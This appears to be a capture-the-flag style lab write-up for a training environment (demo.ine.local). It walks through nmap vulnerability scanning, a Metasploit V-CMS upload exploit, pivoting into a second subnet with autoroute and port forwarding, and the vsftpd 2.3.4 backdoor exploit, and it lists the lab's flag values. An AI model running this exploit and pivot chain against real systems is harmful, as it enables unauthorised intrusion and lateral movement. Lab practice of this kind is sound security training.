# BLACK BOX TESTING 1

## GIVEN   
**MY IP ADDRESS**: 192.101.56.2

## PROCEDURE

### RECON

```
nmap -sV --script vuln -p- demo.ine.local
```

![1.1](./imgs/1.1.png)

**OPEN PORTS**:<br>
80 http (nginx 1.14.0 Web Server),<br>
3306 mysql,<br>

Port 80 is hosting V-CMS v1.0<br>

Google "vcms 1.0 vuln"<br>

![1.2](./imgs/1.2.png)

**VULN**: V-CMS PHP File Upload and Execute

### EXPLOIT

```
searchsploit vcms
msfconsole
search vcms
use exploit/linux/http/vcms_upload
set RHOSTS demo.ine.local
set TARGETURI /
set LHOST 192.101.56.2
exploit
```

![2.1](./imgs/2.1.png)

### GET FLAG 1

```
search -f *flag*
cat /root/flag.txt
```

![3.1](./imgs/3.1.png)

**FLAG 1**: 4f96a3e848d233d5af337c440e50fe3d

### PIVOT

```
shell
ifconfig
```

![4.1](./imgs/4.1.png)

Device connected to 2 networks

eth0: 192.101.56.3
**eth1**: 192.4.78.2

Add route to new network
-s IP/CIDR
```
run autoroute -s 192.4.78.0/24
background
route print
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.4.78.0/24
run
```

![4.2](./imgs/4.2.png)

**IP (PORTS)**:<br>
192.4.78.1 (22),<br>
192.4.78.2 (80, 3306),<br>
**192.4.78.3 (21, 22)**<br>

This will associate port 1234 on the hacked machine as port 21 on the new machine<br>
-l LISTEN_PORT<br>
-p TARGET_PORT<br>
-r TARGET_IP
```
sessions -i 1
portfwd add -l 1234 -p 21 -r 192.4.78.3
background
nmap -A --script vuln -p 1234 localhost
```

![4.3](./imgs/4.3.png)

**PORT 21**: vsftpd 2.0.8

## EXPLOIT

```
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.4.78.3
exploit #Didn't work the first time
exploit
find / -iname *flag*
```

![5.1](./imgs/5.1.png)

**FLAG 2**: 58c7c29a8ab5e7c4c06256b954947f9a